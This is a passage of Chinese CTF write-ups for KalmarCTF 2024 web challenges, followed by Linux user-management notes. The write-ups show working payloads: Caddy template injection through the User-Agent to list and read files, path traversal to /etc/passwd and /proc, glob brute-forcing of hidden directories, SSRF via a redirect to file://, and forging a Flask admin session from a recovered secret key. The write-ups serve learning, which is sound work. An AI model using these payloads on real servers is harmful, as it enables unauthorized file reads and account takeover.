&lt;a href=&quot;https://http1.caddy.chal-kalmarc.tf/&quot;&gt;http/1.1&lt;/a&gt;? &lt;a href=&quot;https://http2.caddy.chal-kalmarc.tf/&quot;&gt;http/2&lt;/a&gt;? Or fancy for some &lt;a href=&quot;https://http3.caddy.chal-kalmarc.tf/&quot;&gt;http/3&lt;/a&gt;?! Check your preference &lt;a href=&quot;https://http.caddy.chal-kalmarc.tf/&quot;&gt;here&lt;/a&gt;.&lt;br/&gt;We also allow you to check &lt;a href=&quot;https://tls12.caddy.chal-kalmarc.tf/&quot;&gt;TLS/1.2&lt;/a&gt;, &lt;a href=&quot;https://tls13.caddy.chal-kalmarc.tf/&quot;&gt;TLS/1.3&lt;/a&gt;, &lt;a href=&quot;https://tls.caddy.chal-kalmarc.tf/&quot;&gt;TLS preference&lt;/a&gt;, supports &lt;a href=&quot;https://mtls.caddy.chal-kalmarc.tf/&quot;&gt;mTLS&lt;/a&gt;? Checkout your &lt;a href=&quot;https://ua.caddy.chal-kalmarc.tf/&quot;&gt;User-Agent&lt;/a&gt;!&lt;!-- At some point we might even implement a &lt;a href=&quot;https://flag.caddy.chal-kalmarc.tf/&quot;&gt;flag&lt;/a&gt; endpoint! --&gt;`&#125;
+
+对于没用接触过的Caddy的我只能去官方文档看看其中的配置文件所代表的含义  查了下发现还有中文文档哈哈哈哈哈哈哈哈哈哈
+链接：Caddy v2中文文档 (dengxiaolong.com)
+不懂的就半查半猜，问问狗屁通，然后有个初步的理解:
+Caddy中存在一个概念：片段
+(指令名)&#123;	具体的指令内容&#125;
+
+例如：
+(html_reply) &#123;    import sec_headers    header Content-Type text/html    templates    respond &quot;&lt;!DOCTYPE html&gt;&lt;meta charset=utf-8&gt;&lt;title&gt;&#123;http.request.host&#125;&lt;/title&gt;&lt;body&gt;&#123;args[0]&#125;&lt;/body&gt;&quot;&#125;
+
+片段类似于我们熟悉的概念：函数，可以在被调用
+在任何你需要的地方重复使用它：
+import 指令名
+
+
+
+块
+块由一对花括号完成的：
+... &#123;	...&#125;
+
+花括号前写所服务的域名，花括号后填写对应的指令
+此外在片段中有一个特别的指令：templates-模板，类似于python中的Jinja2模板引擎，进行实时渲染
+对应的官方文档：Module http.handlers.templates - Caddy Documentation (caddyserver.com)
+根据templates对应的语法规则（&#123;&#123;指令&#125;&#125;）尝试能不能和Python一样进行模板注入
+由于修改UA（User-Agent）比较方便，所以我选择了ua.caddy.chal-kalmarc.tf，将UA修改为&#123;&#123;7*7&#125;&#125;发现服务端返回了500错误，发现这个思路应该是有戏，修改为&#123;&#123;.Host&#125;&#125;发现最后页面返回了User-Agent: ua.caddy.chal-kalmarc.tf，发现确实可以进行类似模板注入的操作，而官方文档中有两个可以让我们读到flag的指令
+1.readFile
+Reads and returns the contents of another file, as-is. Note that the contents are NOT escaped, so you should only read trusted files.按原样读取并返回另一个文件的内容。请注意，内容不会被转义，因此您应该只读取受信任的文件。
+&#123;&#123;readFile &quot;path/to/file.html&quot;&#125;&#125;
+
+2.listFiles
+Returns a list of the files in the given directory, which is relative to the template context’s file root.返回给定目录中的文件列表，该列表相对于模板上下文的文件根目录。
+&#123;&#123;listFiles &quot;/mydir&quot;&#125;&#125;
+
+因此我们修改UA为&#123;&#123;listFiles "/"&#125;&#125;获得flag的文件名： CVGjuzCIVR99QNpJTLtBn9
+然后再修改UA为&#123;&#123;readFile "/CVGjuzCIVR99QNpJTLtBn9"&#125;&#125;，最后成功获取flag：
+kalmar&#123;Y0_d4wg_I_h3rd_y0u_l1k3_templates_s0_I_put_4n_template_1n_y0ur_template_s0_y0u_c4n_readFile_wh1le_y0u_executeTemplate&#125;
+BadAss Server for Hypertext强悍的超文本服务器
+题目描述
+I wrote my own HTTP server. I have to admit: the code is a bit cursed, but it works! So no problem, right?
+我自己写了一个HTTP服务器。我必须承认：代码有点诡异，但是它能正常工作！所以没问题，对吗？
+
+前置知识
+/proc目录以及子目录的功能及其作用
+shell语言
+通配符
+
+解题思路这是一个黑盒测试，点击题目链接后发现就一个按钮可以交互
+
+点击这个按钮，跳转到http://chal-kalmarc.tf:8080/assets/26c3f25922f71af3372ac65a75cd3b11/iceberg.jpg，没用任何信息。查看初始页面的源码发现被隐藏了另一个按钮
+&lt;!-- &lt;a href=&quot;assets/f200d055a267ae56160198e0fcb47e5f/try_harder.txt&quot;&gt;	&lt;button&gt;Get the flag&lt;/button&gt;&lt;/a&gt; --&gt;
+
+再次点进去，发现就一句话：Did you think it was this easy? Nah, this isn&#39;t the flag.
+也没什么实际的价值点（其实后面这两个东东会被利用到），然后就是无头无脑的不断尝试了robots.txt、抓包再发包
+这个过程中发现了一个比较有趣的，响应头中存在这样一个键值：X-Powered-By: Bash，shell语言做后端？？
+发现随便输入一个内容到url后如果不存在会输出为：cat: /app/static/1: No such file or directory，可以大胆推测后端为shell语言了
+然后我就开始怀疑是不是有目录创越的漏洞存在了，拦截请求包转到BP进行改包（浏览器的url中直接输入..会被删除，而并不会直接传会后端）将url修改为/../../../../../etc/passwd,返回包中出现了passwd中对应的内容
+
+逻辑漏洞1：发现目录穿越漏洞确实存在，可以尝试直接读一下/flag发现根目录下不存在flag文件，那就只能进/proc目录找找对应的进程和运行目录了，一般读取1进程（一般赛题docker中最初的线程号为1）和self进程（当前指令所属的进程），一通乱尝试cmdline、environ、status等等发现了一些有用的东西
+在/../../../../../proc/1/cmdline尝试读取后端的运行程序
+HTTP/1.0 200 OKContent-Type: inode/x-emptyX-Powered-By: BashContent-Length: 0Connection: closesocat TCP4-LISTEN:8080,reuseaddr,fork EXEC:/app/badass_server.sh
+
+此时我们可以找到我们的后端所属的脚本文件，我们再将它读取出来，尝试看看源码中是否存在漏洞。读取到的源码为：
+#!/bin/bash# I hope there are no bugs in this source code...set -edeclare -A request_headersdeclare -A response_headersdeclare methoddeclare urideclare protocoldeclare request_bodydeclare status=&quot;200 OK&quot;abort() &#123;	declare -gA response_headers	status=&quot;400 Bad Request&quot;	write_headers	if [ ! -z $&#123;1+x&#125; ]; then		&gt;&amp;2 echo &quot;Request aborted: $1&quot;		echo -en $1	fi	exit 1&#125;write_headers() &#123;	response_headers[&#x27;Connection&#x27;]=&#x27;close&#x27;	response_headers[&#x27;X-Powered-By&#x27;]=&#x27;Bash&#x27;	echo -en &quot;HTTP/1.0 $status\r\n&quot;	for key in &quot;$&#123;!response_headers[@]&#125;&quot;; do		echo -en &quot;$&#123;key&#125;: $&#123;response_headers[$key]&#125;\r\n&quot;	done	echo -en &#x27;\r\n&#x27;	&gt;&amp;2 echo &quot;$(date -u +&#x27;%Y-%m-%dT%H:%M:%SZ&#x27;) $SOCAT_PEERADDR $method $uri $protocol -&gt; $status&quot;&#125;receive_request() &#123;	read -d $&#x27;\n&#x27; -a request_line	if [ $&#123;#request_line[@]&#125; != 3 ]; then		abort &quot;Invalid request line&quot;	fi	method=$&#123;request_line[0]&#125;	uri=$&#123;request_line[1]&#125;	protocol=$(echo -n &quot;$&#123;request_line[2]&#125;&quot; | sed &#x27;s/^\s*//g&#x27; | sed &#x27;s/\s*$//g&#x27;)	if [[ ! $method =~ ^(GET|HEAD)$ ]]; then		abort &quot;Invalid request method&quot;	fi	if [[ ! $uri =~ ^/ ]]; then		abort &#x27;Invalid URI&#x27;	fi	if [ $protocol != &#x27;HTTP/1.0&#x27; ] &amp;&amp; [ $protocol != &#x27;HTTP/1.1&#x27; ]; then		abort &#x27;Invalid protocol&#x27;	fi	while read -d $&#x27;\n&#x27; header; do		stripped_header=$(echo -n &quot;$header&quot; | sed &#x27;s/^\s*//g&#x27; | sed &#x27;s/\s*$//g&#x27;)		if [ -z &quot;$stripped_header&quot; ]; then			break;		fi		header_name=$(echo -n &quot;$header&quot; | cut -d &#x27;:&#x27; -f 1 | sed &#x27;s/^\s*//g&#x27; | sed &#x27;s/\s*$//g&#x27; | tr &#x27;[:upper:]&#x27; &#x27;[:lower:]&#x27;);		header_value=$(echo -n &quot;$header&quot; | cut -d &#x27;:&#x27; -f 2- | sed &#x27;s/^\s*//g&#x27; | sed &#x27;s/\s*$//g&#x27;);		if [ -z &quot;$header_name&quot; ] || [[ &quot;$header_name&quot; =~ [[:space:]] ]]; then			abort &quot;Invalid header name&quot;;		fi		# If header already exists, add value to comma separated list		if [[ -v request_headers[$header_name] ]]; then			request_headers[$header_name]=&quot;$&#123;request_headers[$header_name]&#125;, $header_value&quot;		else			request_headers[$header_name]=&quot;$header_value&quot;		fi	done	body_length=$&#123;request_headers[&quot;content-length&quot;]:-0&#125;	if [[ ! $body_length =~ ^[0-9]+$ ]]; then		abort &quot;Invalid Content-Length&quot;	fi	read -N $body_length request_body&#125;handle_request() &#123;	# Default: serve from static directory	path=&quot;/app/static$uri&quot;	path_last_character=$(echo -n &quot;$path&quot; | tail -c 1)	if [ &quot;$path_last_character&quot; == &#x27;/&#x27; ]; then		path=&quot;$&#123;path&#125;index.html&quot;	fi	if ! cat &quot;$path&quot; &gt; /dev/null; then		status=&quot;404 Not Found&quot;	else		mime_type=$(file --mime-type -b &quot;$path&quot;)		file_size=$(stat --printf=&quot;%s&quot; &quot;$path&quot;)		response_headers[&quot;Content-Type&quot;]=&quot;$mime_type&quot;		response_headers[&quot;Content-Length&quot;]=&quot;$file_size&quot;	fi	write_headers	cat &quot;$path&quot; 2&gt;&amp;1&#125;receive_requesthandle_request
+
+由于是shell语言这里我想到了一些shell中的一些骚操作例如：
+ $&#123;变量名&#125;  #会将变量的值进行拓展出来$(命令)  #会执行（）中的命令`命令`  #会执行` `中的命令
+
+ 拓展：shell语言中的部分特性 
+              
+              特性1：展开按照展开顺序分为：花括号展开（Brace Expansion）：花括号展开可以用来生成一系列具有相似结构的字符串。例如，使用花括号展开可以生成一组文件名或者一组命令参数。示例：$ echo &#123;a,b,c&#125;a b c$ echo file&#123;1..3&#125;.txtfile1.txt file2.txt file3.txt波浪线展开（Tilde Expansion）：波浪线展开用于扩展波浪线后面的特殊字符，通常用于表示用户的主目录路径。示例：$ echo ~/home/username$ echo ~/Documents/home/username/Documents参数，变量，算术展开和命令替换：参数展开用于访问脚本或函数的参数，变量展开用于展开变量的值，算术展开用于进行数学运算，而命令替换用于将命令的输出作为展开结果。示例：$ echo $HOME/home/username$ echo $((2 + 2))4$ echo $(ls)file1.txt file2.txt file3.txt单词分割（Word Splitting）：单词分割用于将字符串按照特定的分隔符进行拆分，常见的分隔符包括空格、制表符和换行符。示例：$ string=&quot;Hello World&quot;$ echo $stringHello World$ for word in $string; do echo $word; doneHelloWorld文件名展开（Filename Expansion）：文件名展开用于匹配文件系统中的文件名模式，常见的通配符包括星号（*）和问号（?）。示例：$ ls *.txtfile1.txt file2.txt file3.txt$ rm file?.txt特性2：单双引号的区别单引号：使用单引号，单引号中的内容一律被视为字符串，不进行转义，无法被扩展，${}、$()、反引号、通配符无法被使用例如：root@ubuntu:/home/ubuntu/Desktop# echo /*/app /bin /boot /cdrom /dev /etc /home /lib /lib32 /lib64 /libx32 /lost+found /media /mnt /opt /proc /root /run /sbin /snap /srv /swapfile /sys /tmp /usr /var#通配符不会展开root@ubuntu:/home/ubuntu/Desktop# echo &#x27;/*&#x27;/*root@ubuntu:/home/ubuntu/Desktop# echo &#x27;$(date)&#x27;$(date)双引号：变量展开：双引号内的变量会被展开，即变量的值会替换变量本身。命令替换：双引号内的命令替换（使用$()或反引号&#96;&#96;）会被执行，其输出会替换命令本身。通配符不会展开：双引号内的通配符（如*、?等）不会被作为通配符处理，而是作为普通字符。转义字符：某些特殊字符（如$、反引号、\）可以通过反斜线进行转义以表示其字面意义。例如：#变量展开root@ubuntu:/home/ubuntu/Desktop# path=&quot;*&quot;root@ubuntu:/home/ubuntu/Desktop# echo &quot;$&#123;path&#125;&quot;*#命令替换root@ubuntu:/home/ubuntu/Desktop# echo &quot;$(date)&quot;2024年 03月 24日 星期日 16:55:37 CST#通配符不会展开root@ubuntu:/home/ubuntu/Desktop# echo &quot;*&quot;*特性3：变量展开后的字符串1.进行变量展开后，通配符不受 展开前单双引号性质的影响​	只要最后使用变量时，最外层不存在&quot;&quot;即可展开例如#test1path=&#x27;*&#x27;path_after=&quot;./*&quot;echo $path_after #变量替换后，最外层也无&quot;&quot;的影响，此时通配符*可被展开#输出结果：./badass_server.sh ./character1.sh ./character2.sh#test2path=&#x27;*&#x27;path_after=&quot;./$path&quot;echo ”$path_after“ #变量替换后，最外层存在&quot;&quot;的影响，通配符无法展开#输出结果： ./*2.进行变量展开后，变量展开、命令替换受最开始赋值时的单双引号影响​	若最开始时使用单引号，无论最后使用变量时，最外层存不存在引号，都无法被展开例如：#test1path=&#x27;$(date)&#x27;path_after=&quot;./$path&quot;echo $path_afterpath_after_after=$path_afterecho $path_after_after# 输出结果：# ./$(date)# ./$(date)#test2data= dateecho $datapath=&#x27;$&#123;data&#125;&#x27;path_after=&quot;./$path&quot;echo $path_afterpath_after_after=$path_afterecho $path_after_after# 输出结果：# Sun Mar 24 21:29:51     2024# ./$&#123;data&#125;# ./$&#123;data&#125;
+              
+            
+
+但经过尝试，发现无法通过控制$path这个值变为$&#123;&#125;使最后的cat返回命令替换的结果
+预想结果（可以通过cat的报错获取信息，如果这种办法可行剩下的只是空格的绕过）：
+root@ubuntu:/home/ubuntu/Desktop# url=$(ls)root@ubuntu:/home/ubuntu/Desktop# path=&quot;app/static/$url&quot;root@ubuntu:/home/ubuntu/Desktop# cat &quot;$path&quot;cat: &#x27;app/static/1.sh&#x27;$&#x27;\n&#x27;&#x27;2&#x27;: 没有那个文件或目录
+
+实际结果
+
+ 拓展：shell语言中的部分特性 
+              
+              特性4：read命令处理字符串使用read命令来读取输入的字符串时，所读取的字符串相当于被单引号包围，具有单引号包裹的字符串的特点变量不展开：单引号内的内容都会被当作普通字符串处理，包括变量，它们不会被展开。命令不替换：单引号内的命令不会被执行，即使使用$()或反引号&#96;&#96;。通配符不展开：单引号内的通配符同样不会被展开，被视为普通文本。转义字符不工作：单引号内几乎所有的字符都被视为普通字符，包括反斜线（\），它不具有转义功能。例如：#test1read -d $&#x27;\n&#x27; -a request_linemethod=$&#123;request_line[0]&#125;echo $method#输入：$(ls) $(ls) $(ls)#输出：$(ls)#test2request_line=(&quot;$(ls)&quot; &quot;$(ls)&quot;)method=$&#123;request_line[0]&#125;echo $method#输出：badass_server.sh bash.md
+              
+            
+
+此时发现我们可控点只剩下$protocol变量
+protocol=$(echo -n &quot;$&#123;request_line[2]&#125;&quot; | sed &#x27;s/^\s*//g&#x27; | sed &#x27;s/\s*$//g&#x27;) if [ $protocol != &#x27;HTTP/1.0&#x27; ] &amp;&amp; [ $protocol != &#x27;HTTP/1.1&#x27; ]; then	abort &#x27;Invalid protocol&#x27;fi
+
+逻辑漏洞2：可控原因：$protocol变量由于使用echo命令，是得read读取后的特性消失，使得$protocol可被拓展
+当我们尝试修改HTTP/1.1为/*时，发现并没有出现Invalid protocol
+ 拓展：shell语言中的部分特性 
+              
+              特性4：[]的返回值在 shell 中，[] 符号通常用于条件测试。如 if [ CONDITION ]; then ... 这样的语句。在这种用法中，[] 是 [ 命令的简写，这实际上是一个指向 test 命令的链接。因此，当你使用 [] 时，实际上是在调用 test 命令来评估一个条件。test 命令（或其等价的 [ 形式）的返回值遵循 shell 命令的通用返回值约定：0：表示测试的条件为真（true）。1：表示测试的条件为假（false）。。&gt;1：如果出现错误，如语法错误或使用了无效的选项，test 命令可能会返回大于 1 的值。比较特别的是，此时即使设置了set -e也不会退出程序
+              
+            
+
+逻辑漏洞3：将HTTP/1.1替换为/*时，由于通配符展开，最后会出现进行匹配错误，[]返回大于1的结果，&amp;&amp;的两侧结果都是大于0，返回1，因此认为是假，此时这个if条件被判定为假，可以继续执行后面内容的代码
+但如果/*匹配到的结果只有一个时，并不会造成匹配错误，而直接返回0，&amp;&amp;的任意一侧结果为0会直接返回0，此时这个if条件被判定为真
+启动set -x时的详细信息如下
++ &#x27;[&#x27; badass_server.sh bash.md character1.sh character2.sh file &#x27;!=&#x27; HTTP/1.0 &#x27;]&#x27;./badass_server.sh: line 63: [: too many arguments
+
+注意：此时通配符展开并不能认为这个变量是数组，数组直接使用会利用数组第0个进行匹配，而通配符展开会报错
+因此我们可以通过这个点，使用glob通配符[]写入一个已知的字符，不断修改字符，使其最后能匹配到的结果最后有1个以上，页面不出现：Invalid protocol，进行对目录或者文件名的一步一步匹配（用这种方法可以确定名称比已知目录少的目录名）
+最初的页面给出了两个目录，需要利用这两个目录，选择一个目录作为已知字符
+&lt;a href=&quot;assets/26c3f25922f71af3372ac65a75cd3b11/iceberg.jpg&quot;&gt;	&lt;button&gt;Explore the iceberg&lt;/button&gt;&lt;/a&gt;&lt;!-- &lt;a href=&quot;assets/f200d055a267ae56160198e0fcb47e5f/try_harder.txt&quot;&gt;	&lt;button&gt;Get the flag&lt;/button&gt;&lt;/a&gt; --&gt;
+
+以26c3f25922f71af3372ac65a75cd3b11作为已知字符为例，所以最后的playload的过程为：
+GET /../../../../../../etc/passwd /app/static/assets/[29]*GET /../../../../../../etc/passwd /app/static/assets/[29][6d]*GET /../../../../../../etc/passwd /app/static/assets/[29][6d][cf]*........
+
+最后找到隐藏的目录， 9df5256fe48859c91122cb92964dbd66 
+估计最后是猜的吧，flag最后的位置是：/app/static/assets/9df5256fe48859c91122cb92964dbd66/flag.txt
+修改url为../../../../../app/static/assets/9df5256fe48859c91122cb92964dbd66/flag.txt读出kalmar&#123;17b29adf_bash_web_server_was_a_mistake_374add33&#125;
+Is It Down它是否宕机
+题目描述
+In an increasingly online world it is nice to know, if you are the only one being offline or if everybody else are having offline too.
+在一个日益在线化的世界中，了解自己是唯一离线还是其他人也处于离线状态是很重要的。
+We present to you: Is it down!
+我们向您介绍：它是否宕机！
+Rumour has it, that a flag is stored somewhere on this server.
+有传言称，一个标志位被存储在这台服务器的某个地方。
+
+前置知识
+/proc目录以及子目录的功能及其作用
+Python语言及特性
+__pycache__文件夹
+
+解题思路同样的这也是一个黑盒测试，看了看页面发现并没有什么提示，可以根据自己的输入的网址进行判断，网址是否在线或者离线
+
+直接抓包然后repeat看看
+
+会发现页面出现了我们输入网页的源代码，相关的漏洞应该就是SSRF
+尝试直接使用file:///etc/passwd试试看，发现页面回显出了
+&#123;&quot;error&quot;:&quot;Url must start with &#x27;https://&#x27;. We do not want anything insecure here!&quot;,&quot;success&quot;:false&#125;
+
+发现只能使用https://开头的链接（是我应该就在这卡住了）
+根据大佬的思路，我们可以尝试一个发生重定向的网址，  无语啦 。。。。。。。。好麻烦，还得自己起个https服务
+根据实际的测试发现：
+
+如果输入的链接网页存在任何内容，不会跟随着网页重定向
+如果输入的链接网页不存在任何内容，此时会跟随着网页重定向
+
+例如：
+我们输入网址的响应包为：
+HTTP/1.1 301 Moved PermanentlyServer: nginxDate: Sun, 24 Mar 2024 15:00:50 GMTContent-Type: text/htmlContent-Length: 162Connection: closeLocation: https://t.doruo.cn/14Qqfhjr2&lt;html&gt;&lt;head&gt;&lt;title&gt;301 Moved Permanently&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;center&gt;&lt;h1&gt;301 Moved Permanently&lt;/h1&gt;&lt;/center&gt;&lt;hr&gt;&lt;center&gt;nginx&lt;/center&gt;&lt;/body&gt;&lt;/html&gt;
+
+此时，不跟随重定向，返回的内容为
+&#123;&quot;content&quot;:&quot;&lt;html&gt;\\r\\n&lt;head&gt;&lt;title&gt;301 Moved Permanently&lt;/title&gt;&lt;/head&gt;\\r\\n&lt;body bgcolor=\&quot;white\&quot;&gt;\\r\\n&lt;center&gt;&lt;h1&gt;301 Moved Permanently&lt;/h1&gt;&lt;/center&gt;\\r\\n&lt;hr&gt;&lt;center&gt;openresty&lt;/center&gt;\\r\\n&lt;/body&gt;\\r\\n&lt;/html&gt;\\r\\n&quot;,&quot;online&quot;:true,&quot;success&quot;:true&#125;
+
+
+
+我们自己起一个后端服务，为了随时更改重定向内容，我们可以设置代码为以下
+&lt;?phperror_reporting(0);header(&quot;Location: &quot;.$_GET[&#x27;wells&#x27;]);
+
+此时我们使用这个服务，并输入参数?wells=file:///etc/passwd,发现页面返回出来了passwd的文件内容
+&#123;&quot;content&quot;:&quot;root:x:0:0:root:/root:/bin/ash\\n.........&quot;,&quot;online&quot;:true,&quot;success&quot;:true&#125;
+
+此时再次利用/proc目录进行尝试找到后端服务的文件夹位置以及所对应的运行程序
+在/proc/1/cmdline尝试读取后端的运行程序的相关信息uwsgi\\x00--ini\\x00/etc/uwsgi/uwsgi-custom.ini\\x00，可以猜到此时的后端应该是flask，然后再顺藤摸瓜进入到/etc/uwsgi/uwsgi-custom.ini读取配置信息：（美化后）
+[uwsgi]uid = www-datagid = www-datamaster = trueprocesses = 4http-socket = 0.0.0.0:5000chmod-sock = 664vacuum = truedie-on-term = truewsgi-file = /var/www/keep-dreaming-sonny-boy/app.pycallable = apppythonpath = /usr/local/lib/python3.11/site-packages
+
+比较重要的信息是：wsgi-file = /var/www/keep-dreaming-sonny-boy/app.py，然后继续顺藤摸瓜找到对应的后端文件读出出来，因为经过了json的转化，变得无敌难看，让狗屁通美化一下最后得到
+from flask import Flask, request, send_from_directory, session, abortfrom requestlib import fetchfrom config import session_encryption_keyimport subprocess, osdef protect_secrets():    os.unlink(&quot;config.py&quot;)def check_url(url):    if not isinstance(url, str) or len(url) == 0:        return False, &quot;Please provide a regular url!&quot;    if not url.startswith(&quot;https://&quot;) or url.lstrip() != url:        return False, &quot;Url must start with &#x27;https://&#x27;. We do not want anything insecure here!&quot;    return True, &quot;&quot;app = Flask(__name__, static_folder=&#x27;static&#x27;, static_url_path=&#x27;/assets/&#x27;)app.secret_key = session_encryption_keyprint(&quot;Using key: &quot;, app.secret_key)protect_secrets()@app.route(&#x27;/&#x27;, methods=[&#x27;GET&#x27;])def home():    return send_from_directory(&#x27;pages&#x27;, &#x27;index.html&#x27;)@app.route(&#x27;/flag&#x27;, methods=[&#x27;GET&#x27;])def healthcheck():    if session.get(&quot;admin&quot;) == True: #        return subprocess.check_output(&quot;/readflag&quot;)    else:        return abort(403)@app.route(&#x27;/check&#x27;, methods=[&#x27;POST&#x27;])def check():    url = request.form.get(&quot;url&quot;)    valid, err = check_url(url)    if not valid:        return &#123;            &#x27;success&#x27;: False,            &#x27;error&#x27;: err        &#125;    if True:        content = fetch(url)        return &#123;            &#x27;success&#x27;: True,            &#x27;online&#x27;: content != None,            &#x27;content&#x27;: content        &#125;if __name__ == &quot;__main__&quot;:    app.run(host=&#x27;0.0.0.0&#x27;, port=10600, debug=False)
+
+但是这里面requestlib库文件是我们安装不了的，尝试直接读取一下requestlib.py查看是不是自己写的库，同样的也是读到了这个文件，经过美化后如下：
+from urllib.request import urlopen, HTTPErrorProcessor, build_opener, Requestimport urllibclass NoRedirection(HTTPErrorProcessor):    def http_response(self, request, response):        return response    https_response = http_responseinstall_opener(build_opener(NoRedirection()))def fetch(url, follow_redirects=True):    &#x27;&#x27;&#x27;    Avoid endless redirect loops    &#x27;&#x27;&#x27;    headers = &#123;        &quot;User-Agent&quot;: &quot;requestlib 2.9-alpha&quot;    &#125;    req = Request(url, headers=headers)    with urlopen(req) as res:        redirect_url = res.headers.get(&quot;Location&quot;))        if redirect_url and follow_redirects:            return fetch(redirect_url, follow_redirects=False)        return str(res.read())[2:-1]
+
+漏洞成因在定义的fetch函数中follow_redirects值默认为True，并且跟随响应包中的Location键值进行判断是否存在重定向，重定向的目标是何。但由于只限制了第一次输入的网址为https://,并未进行对重定向的协议进行检查从而造成了SSRF
+ 如何处理重定向 
+              
+              注意：如浏览器，powershell中的curl再处理重定向时，无法处理从https://重定向至file://powershell中的curl发生报错浏览器会提示页面错误
+              
+            
+
+做到这里，关键其实是为造出一个session，其键值存在admin: True,但存有session_encryption_key的config.py再被调用后就被删除了,需要找到如何复原的办法
+@app.route(&#x27;/flag&#x27;, methods=[&#x27;GET&#x27;])def healthcheck():    if session.get(&quot;admin&quot;) == True: #        return subprocess.check_output(&quot;/readflag&quot;)    else:        return abort(403)
+
+__pycache__文件夹
+在Python工作目录下，如果执行某文件后经常会自动生成一个__pycache__文件夹。__pycache__文件夹正是缓存*.pyc地方。*.pyc文件的命名格式是&lt;module&gt;.&lt;interpreter_version&gt;.pyc。注意，对于被导入（import）的module才会生成对应的*.pyc文件
+详细文档可参考：
+【Python】__pycache__文件夹是什么东西？ - 知乎 (zhihu.com)
+pyhton中__pycache__文件夹的产生与作用_pycache文件夹下的东西是如何产生的-CSDN博客
+例子：
+以被导入的为config.py文件为例，最后生成在__pycache__文件夹config.cpython-35.pyc，最开始的config为被导入的文件名，cpython代表的是c语言实现的Python解释器，-35代表的是版本为3.5版。
+
+因此，我们可以在__pycache__文件夹中找到config的.pyc文件，再进行逆向
+最后测试到路径为：/var/www/keep-dreaming-sonny-boy/__pycache__/config.cpython-311.pyc，里面的内容为：
+\\xa7\\r\\r\\n\\x00\\x00\\x00\\x00\\x86\\x84\\xf7e;\\x00\\x00\\x00\\xe3\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xf3\\n\\x00\\x00\\x00\\x97\\x00d\\x00Z\\x00d\\x01S\\x00)\\x02\\xda Rm7GbQJ4uDikyiis6miD7YwsN11rEjfLN)\\x01\\xda\\x16session_encryption_key\\xa9\\x00\\xf3\\x00\\x00\\x00\\x00\\xfa*/var/www/keep-dreaming-sonny-boy/config.py\\xfa\\x08&lt;module&gt;r\\x07\\x00\\x00\\x00\\x01\\x00\\x00\\x00s\\x11\\x00\\x00\\x00\\xf0\\x03\\x01\\x01\\x01\\xd8\\x19;\\xd0\\x00\\x16\\xd0\\x00\\x16\\xd0\\x00\\x16r\\x05\\x00\\x00\\x00
+
+由于转化为json后转义字符\会变成\\,叫狗屁通写一个小小的脚本把以上数据恢复成二进制数据
+data_str = &quot;&quot;&quot;\\xa7\\r\\r\\n\\x00\\x00\\x00\\x00\\x86\\x84\\xf7e;\\x00\\x00\\x00\\xe3\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xf3\\n\\x00\\x00\\x00\\x97\\x00d\\x00Z\\x00d\\x01S\\x00)\\x02\\xda Rm7GbQJ4uDikyiis6miD7YwsN11rEjfLN)\\x01\\xda\\x16session_encryption_key\\xa9\\x00\\xf3\\x00\\x00\\x00\\x00\\xfa*/var/www/keep-dreaming-sonny-boy/config.py\\xfa\\x08&lt;module&gt;r\\x07\\x00\\x00\\x00\\x01\\x00\\x00\\x00s\\x11\\x00\\x00\\x00\\xf0\\x03\\x01\\x01\\x01\\xd8\\x19;\\xd0\\x00\\x16\\xd0\\x00\\x16\\xd0\\x00\\x16r\\x05\\x00\\x00\\x00&quot;&quot;&quot;# 将字符串中的转义序列转换为相应的二进制数据binary_data = bytes(data_str, &quot;utf-8&quot;).decode(&quot;unicode_escape&quot;).encode(&quot;latin1&quot;)# 保存到文件with open(&quot;output_binary_data.txt&quot;, &quot;wb&quot;) as file:    file.write(binary_data)
+
+.pyc文件的逆向在网上就很多在线的工具可以进行使用，逆向后得到
+#!/usr/bin/env python# visit https://tool.lu/pyc/ for more information# Version: Python 3.11session_encryption_key = &#x27;Rm7GbQJ4uDikyiis6miD7YwsN11rEjfL&#x27;
+
+再使用session伪造工具flask-session-cookie-manager为造出一个session出来，指令为：
+python flask_session_cookie_manager3.py encode -s &#x27;Rm7GbQJ4uDikyiis6miD7YwsN11rEjfL&#x27; -t &quot;&#123;&#x27;admin&#x27;:True&#125;&quot;
+
+最后得到伪造的session所对应的cookie为：eyJhZG1pbiI6dHJ1ZX0.ZgBMeg.t2OWSLBvEeZpMPUZNBFFcmsFS-o，手动填入浏览器中，并访问&#x2F;flag
+
+最后得到flag：kalmar&#123;Rem3Mbr_T0_fl0sh!&#125;
+ 查看Wells的丢人过程 
+              
+              我想着不是伪造出session最后的结果时运行/readflag这个可执行文件，便尝试读取了一下，转化为二进制，再发给逆向的同学看看能不能找出flag位于哪里命名为什么直接读取出来也确实逆向出来，找到了flag的位置以及名称但出题人也估计想到了这一点，位于flag.txt设置了权限，没法被直接读取出来。。。。。。。跪谢逆向的同学：L0SJ0K
+              
+            
+
+
+
+参考文章：
+https://ireland.re/posts/KalmarCTF_2024/
+
+]]></content>
+      <categories>
+        <category>CTF</category>
+      </categories>
+      <tags>
+        <tag>CTF-WriteUp</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Linux笔记</title>
+    <url>/posts/1406167115/</url>
+    <content><![CDATA[用户管理创建指令通常是useradd或adduser
+
+使用useradd命令：sudo useradd 选项 用户名
+
+
+选项:
+-c comment 指定一段注释性描述。
+-d 目录 指定用户主目录（如果已存在）。如果此目录不存在，则同时使用-m选项，可以创建主目录。如：sudo useradd –d  /home/sam -m sam
+-g 用户组 指定用户所属的用户组。
+-G 用户组，用户组 指定用户所属的附加组。
+-s Shell文件 指定用户的登录Shell。
+-u 用户号 指定用户的用户号，如果同时有-o选项，则可以重复使用其他用户的标识号。
+
+
+
+
+使用adduser命令：sudo adduser 用户名
+
+创建用户后，系统会自动为该用户分配一个默认的主目录和用户组。
+设置密码passwd命令：
+sudo passwd 选项 用户名
+
+选项：
+
+-l 锁定口令，即禁用账号。
+-u 口令解锁。
+-d 使账号无口令。
+-f 强迫用户下次登录时修改口令。
+
+修改帐号usermod命令，其格式如下：
+usermod 选项 用户名
+
+常用的选项包括-c, -d, -m, -g, -G, -s, -u以及-o等，这些选项的意义与useradd命令中的选项一样，可以为用户指定新的资源值。
+另外，有些系统可以使用选项：-l 新用户名
+这个选项指定一个新的账号，即将原来的用户名改为新的用户名。
